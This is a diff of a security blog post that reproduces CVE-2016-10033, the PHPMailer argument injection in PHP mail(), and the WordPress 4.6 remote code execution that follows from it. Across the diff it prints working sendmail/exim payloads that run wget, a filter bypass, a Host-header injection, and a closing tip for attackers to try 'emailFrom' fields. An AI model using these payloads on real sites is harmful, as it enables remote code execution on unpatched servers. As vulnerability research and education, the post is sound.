@@ -2,7 +2,7 @@
 layout: post
 title:  "From C code to CMS software: Getting RCE in Wordpress 4.6 thanks to ArgumentI"
 categories: CVEReproduction 
-tags: ArgumentI PHP C
+tags:  ArgumentI PHP C
 author: AlvaroFolgado
 ---
 
@@ -10,25 +10,24 @@ author: AlvaroFolgado
 {:toc}
 
 
-![](/images/phpcommandi.png)
+![](/images/phpmailerintro.jpg)
 
 ## Introduction
 
 This is the first post within the category: "CVEReproduction". In these series I will be using existing reported CVE's or vulnerabilities and try to reproduce it correctly. The objective here is to use learned Attack Vectors in "TheoricalPractise" and see how this works in real software. As in the previous Sections this will be always supported by a PoC using vulnerable software. Inside [Poc Section](http://afolgado.com/poc/) we have everything we need to reproduce it, and the vulnerable code/software.
 
-PHPMailer PoC is very similar to [Php:CommandI&ArgumentI](http://www.afolgado.com/2017/06/10/phpcommandiargumenti/). First function is using simply PHP mail() and second one is using a default PHPMailer configuration to send an email.
-As an extra software we have a vulnerable version of Wordpress 4.6 to test the last PHPMailer vulnerability.
+PHPMailer PoC is very similar to [Php:CommandI&ArgumentI](http://www.afolgado.com/2017/06/10/phpcommandiargumenti/). First function is using PHP mail() and second one is using the default PHPMailer configuration to send an email.
+To test the Wordpress vulnerability we will need old wordpress 4.6 and an old apache server version (tested on Ubuntu 10.04/apache 2.2.14).
 
 
 ## Argument Injection as a functionality: PHP mail() 
 
-In the last post we talked about the different dangerous functions that can be prone to Command Injection and Argument Injection. Those are obvious dangerous functions, but sometimes, the language provide us with more functions that we don't know yet that they are dangerous, or simply the developers doesn't know it when they are coding. This new dangerous function is the basic mail function in PHP. This function receive a bunch of parameters as we can see in the PHP 7 source code (Yes it is C!).
+In the last post we talked about the different dangerous functions that can be prone to Command Injection and Argument Injection. Those are obvious dangerous functions, but sometimes, the language provide us with more functions that we don't know yet that are dangerous . Developers doesn't know sometimes this as well when they are coding, or they don't know the 100% functionaility of some functions (something we can extend to the use of any third party library software). This 'new' dangerous function is the basic mail function in PHP. This function receive a bunch of parameters as we can see in the PHP 7 source code (Yes it is C!).
 
 php-7.1.6/ext/standard/mail.c:
 
-```C
-/* {{{ php_mail
- */
+```c
+
 PHPAPI int php_mail(char *to, char *subject, char *message, char *headers, char *extra_cmd)
 {
 [...]
@@ -66,7 +65,7 @@ PHPAPI int php_mail(char *to, char *subject, char *message, char *headers, char 
 
 ```
 
-In first instance after look at this C code we can think that "popen" as a dangerous function in C is being called without any kind of precaution. A test using our previous "commandebugger" bash script shows a funny result (more about of commandebugger tool [here](http://www.afolgado.com/2017/06/10/phpcommandiargumenti/)).
+In first instance, after look at this C code we can think that "popen" as a dangerous function in C is being called without any kind of precaution. A test using our previous "commandebugger" bash script shows a funny result (more about of commandebugger tool [here](http://www.afolgado.com/2017/06/10/phpcommandiargumenti/)).
 
 ```bash
 Payload in emailFrom:
@@ -78,10 +77,10 @@ Received: -fss@email.com;wget
 Received: http://127.0.0.1/test
 ```
 
-As we can see,input is escaping shell characters, but is leaving the opportunity to add extra Arguments/Options to the sendmail binary. The escaping code is found also in mail.c C file:
+As we can see,the input is being escaped to avoid the injection of shell meta-characters, but is leaving the opportunity to add extra Arguments/Options to the sendmail binary. The escaping code is found also in mail.c file:
 
 php-7.1.6/ext/standard/mail.c:
-```C
+```c
 [...]
 
 	if (force_extra_parameters) {
@@ -93,9 +92,9 @@ php-7.1.6/ext/standard/mail.c:
 [...]
 ```
 
-Although mail() is not vulnerable to Command Injection, Argument Injection is one possiblity. The use of mail() wildy in other libraries/software without precaution will be hazarous. We can consider mail() a dangerous function and I have added it to [Research-Guide](http://www.afolgado.com/researchguide/).
+Although mail() is not vulnerable to Command Injection, Argument Injection is possible (as an functionality defined by the same name 'extra_arguments'). The use of mail() wildy in other libraries/software without precaution will be hazardous. We can consider mail() a dangerous function and I have added it to [Research-Guide](http://www.afolgado.com/researchguide/).
 
-To demostrate this, let's apply a working payload in the PHP mail function and see how it works (using our commandebugger bash scripts). Let's use the last payload from [PHP Argument Injection](http://www.afolgado.com/2017/06/10/phpcommandiargumenti/)), since we know is being escaped, let's use the working payload for the Argument Injection:
+To demonstrate this, let's apply a working payload in the PHP mail function and see how it works (using our commandebugger bash script). Let's use the last payload from [PHP Argument Injection](http://www.afolgado.com/2017/06/10/phpcommandiargumenti/), since we know is being escaped, let's use the working payload for the Argument Injection:
 
 ```bash
 Payload:
@@ -117,7 +116,7 @@ As we can see this will perform correctly the Argument Injection over an uncontr
 ## CVE-2016-10033: The uncontrolled use of mail() by PHPMailer
 
 Now we have explained the dangerous use of mail() in PHP let's talk about real playgrounds: PHPMailer.
-This library help the developper to send emails with a lot of different configurations, we can isntall it in our PHP project using for example composer. As we can see in this PoC, second obtion for send an email is crafting a PHPMailer object with default configurations:
+This third party library help the developer to send emails with a lot of different configurations, we can install it in our PHP projects using for example composer. As we can see in this PoC, second option send an email by crafting a PHPMailer object with default configurations:
 
 
 \poc.php
@@ -139,11 +138,12 @@ if(!$mail->send()) {
 [...]
 ```
 
-Let's look deeper at what is happening inside PHPMailer when we create the PHPMailer object and we trigger the method send with minimum/default configurations:
+Let's look deeper at what is happening inside PHPMailer when we create the PHPMailer object and we trigger the method 'send' with minimum/default configurations:
 
 /phpmailer/class.phpmailer.php
 
-1. Send method called from object:
+1.'Send' method called from object PHPMailer:
+
 ```php
 [...]
 
@@ -167,7 +167,8 @@ Let's look deeper at what is happening inside PHPMailer when we create the PHPMa
 [...]
 ```
 
-2. PostSend() from send():
+2.PostSend() from send():
+
 ```php
 [...]
  public function postSend()
@@ -190,7 +191,7 @@ Let's look deeper at what is happening inside PHPMailer when we create the PHPMa
 [...]
 ```
 
-3. Default configuration of the object will trigger method "mailSend":
+3.Default configurations of the object will trigger method 'mailSend':
 
 ```php
 [...]
@@ -219,10 +220,10 @@ protected function mailSend($header, $body)
                 $this->doCallback($result, array($toAddr), $this->cc, $this->bcc, $this->Subject, $body, $this->From);
 [...]
 ```
-Carefuly let's see how $params variable is made without any kind of Argument Injection Escaping.
-Also is very important for later the fact that ***"Sender" attribute*** is present in the PHPMailer object. If Sender attribute is not present, extra parameters will be not be crafted alongside with the dangerous input "emailFrom".
+Carefully let's see how $params variable is passed into 'mailPassthru' without any kind of Argument Injection Escaping.
+Also is very important for later the fact that ***"Sender" attribute*** is present in the PHPMailer object. If Sender attribute is not present, extra parameters will not be crafted alongside with the dangerous input "emailFrom".
 
-Sender attribute will be set automatically by some methods life "setfrom()":
+Sender attribute will be set automatically set by some methods like "setfrom()":
 
 ```php
 [...]
@@ -254,10 +255,10 @@ Sender attribute will be set automatically by some methods life "setfrom()":
 [...]
 ```
 
-But if developer decides to set PHPMailer attributes by hand, and forgot about Sender, function will stop to be vulnerable.
+But if developer decides to set PHPMailer attributes by hand, and forgot about Sender, function will stop to be vulnerable (since mailsend() will not feed mail() with 'extraParams').
 
 
-3. At last we arrive to mailPassthru(). The function in PHPMailer that calls mail().
+4.At last we arrive to mailPassthru(). The function in PHPMailer that calls mail().
 
 ```php
 [...]
@@ -280,9 +281,10 @@ But if developer decides to set PHPMailer attributes by hand, and forgot about S
 
 In first instance it looks like we can just use the same payload that we used for mail() but we can see that is not working conrrectly:
 
-``bash
+```bash
 Payload:
 ss@email.com -be ${run{/usr/bin/wget${substr{10}{1}{$tod_log}}http://127.0.0.1/test}}
+
 Commandebugger:
 Received: /usr/sbin/sendmail
 Received:
@@ -290,7 +292,7 @@ Received:
 Received:
 ```
 
-Extra parameters sare being blocked, this is due to the email Format filter applied by PHPMailer in "presend()" function:
+Extra parameters are being blocked, this is due to the 'email Format' filter applied by PHPMailer in "presend()" function:
 
 ```php
 [...]
@@ -322,11 +324,12 @@ switch ($patternselect) {
 [...]
 ```
 
-Fortunately,LegalHackers studied ways to bypass this blockage using as reference the email RFC where we should be able to use spaces (This is very well explained by them, the link in the Documentation Section). They have been give us information in how to bypass 'pcre8'. If other filter pattern is used the exploit will not work.
+Fortunately, LegalHackers studied ways to bypass this blockage using as reference the email RFC where we should be able to use spaces (This is very well explained by them, the link in the References Section). They have gave us information about how to bypass 'pcre8' email filter. If other filter pattern is used in PHPMailer, the exploit will not work correctly.
 
 ```bash
 Payload:
 email@dd(tmp1 -be ${run{/usr/bin/wget${substr{10}{1}{$tod_log}}http://127.0.0.1/test}} tmp2)
+
 Commandeugger:
 Received: /usr/sbin/sendmail
 Received: -femail@dd(tmp1
@@ -335,13 +338,13 @@ Received: ${run{/usr/bin/wget${substr{10}{1}{$tod_log}}http://127.0.0.1/test}}
 Received: tmp2)
 ```
 
-Finally we have a working exploit for CVE-2016-1033, when attacker has access to the emailFrom input.
+Finally we have a working exploit for **CVE-2016-1033, when attacker has access to the 'emailFrom' input**.
 
 
 ## Wordpress 4.6 Remote Code Execution
 
-When a common used library as PHPMailer get compromised, a lot of software could get bitten by the exploit. Wordpress 4.6 was one of them. In this last section we are going to exploit it, revieweing the source code of Wordpress to understand exactly what is going on.
-For this, no PoC have been created, because we will use directly a vulnerable version of wordpress instead. Pre-requisites for this to work are [here]().
+When a common used third party library as PHPMailer get compromised, a lot of softwares could get bitten by the exploit. Wordpress 4.6 was one of them. In this last section we are going to exploit it, reviewing the source code of Wordpress to understand exactly what is going on.
+For this, no PoC have been created, because we will use directly a vulnerable version of wordpress instead. Pre-requisites for this to work are [here](https://github.com/AlvFolgado/CVEPoCs/blob/master/PHP/ArgumentI/cve201610033/PocGuide.txt).
 
 Following the existing RCE documentation, we know that the vulnerable parameter is the Hostname HTTP Header in the "lostpassword" function of wordpress 4.6
 
@@ -363,16 +366,16 @@ wordpress4.6/wp-includes/pluggable.php:
 	
 	$phpmailer->setFrom( $from_email, $from_name);
 ```
-As we can see, wht $from_email is being crafted using the 'SERVER_NAME' that came actually from the mentioned HTTP Header.
+As we can see, '$from_email' is being crafted using the 'SERVER_NAME' that actually comes from the cited HTTP HOST Header.
 
-Natural thing to do will be testing the same payload we did in previous PoC but erasing the "email@" part from it. Let's see what happens (we need to use some sript or proxy tool):
+Natural thing to do will be testing the same payload we did in previous PoC but erasing the "email@" part from it. Let's see what happens (we need to use some script or proxy tool):
 
 Payload:
 dd(tmp1 -be ${run{/usr/bin/wget${substr{10}{1}{$tod_log}}http://127.0.0.1/test}} tmp2)
 
 ![](/images/wordpress46request.png)
 
-Bad request is being obtained. Apache Server will not let us to put that HOSTNAME Header with '/' symbols. Fortunately, again, LegalHackers have resolved this problem by studying the env. variables from exim4 (more information in suggested posts). Once again we perform the Request with the valid payload:
+Bad request is being responded. Apache Server will not let us to put that HOSTNAME Header with '/' symbols. Fortunately, again, LegalHackers have resolved this problem by studying the env. variables from exim4 (more information in suggested posts). Once again we perform the Request with the valid payload:
 
 ```bash
 Payload:
@@ -409,13 +412,13 @@ wordpress4.5/wp-includes/pluggable.php:
 
 ```
 
-We spoke before about it. In previous version of Wordpress 'setAddress()' is not being used, instead the PHPMailer object is being accessed manually. This will disable the 'extra_params' option, and spoil our opportunity to exploit it (since 'Sender' is not being set).
+We spoke before about this subject. In previous version of Wordpress 'setAddress()' is not being used, instead the PHPMailer object is being accessed manually. This will disable the 'extra_params' option, and spoil our opportunity to exploit it (since 'Sender' is not being set).
 
 ## Conclusions
 
-As a **Defender** let's update our software. By having either a latest version of PHPMailer,Wordpress or even Apache Server, this will be not possible.
+As a **Defender** let's update our software and third party libraries. For example, by having either a latest version of PHPMailer,Wordpress or even Apache Server, the last RCE for wordpress 4.6 will not be possible.
 
-As an **Attacker** if we know the target web application is running PHP and we have access to a 'emailFrom' parameter in any functon as 'contactme,forgetpassword,etc...' it will worth the shot to try this.
+As an **Attacker** if we know the target web application is running PHP and we have access to a 'emailFrom' parameter in any function as 'contactme,forgetpassword,etc...' it will worth the shot to try this. Knowing the target used technology is an useful tool to hack into it.
 
 
 ## References
